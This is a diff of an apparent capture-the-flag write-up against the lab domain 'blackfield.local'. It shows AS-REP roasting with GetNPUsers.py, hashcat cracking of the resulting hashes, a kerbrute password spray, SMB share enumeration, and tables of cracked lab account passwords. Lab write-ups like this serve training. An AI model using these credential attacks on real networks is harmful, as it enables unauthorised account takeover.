@@ -219,7 +219,9 @@ For now I cannot make a lot of sense of this share!!
 
 ---
 
-###  500.1 ASP-REP Roasting
+### 500.1 Password Attacks
+
+##### 500.2 ASP-REP Roasting
 
 ```sh
 python3 GetNPUsers.py \
@@ -252,10 +254,18 @@ hashcat -a0 -w3  -m18200 -ocracked.txt asprep.hashcat rockyou.txt
 | --------- | --------------- |
 | audit2020 | #00^BlackKnight |
 
----
+##### 500.3 Password Reuse Attacks
 
-#### 600.1 Shares
+We were able to authenticate with the cracked password and the  `support`account. 
+However I could not login with `audit2020`! maybe the account is locked ? 
 
 ```sh
-nxc smb -u 'audit2020' -p '#00^BlackKnight' --shares dc01
+./kerbrute passwordspray -d blackfield.local users.txt '#00^BlackKnight'
 ```
+![](images/support.png)
+
+
+| account   | password        |
+| --------- | --------------- |
+| audit2020 | #00^BlackKnight |
+| support   | #00^BlackKnight |
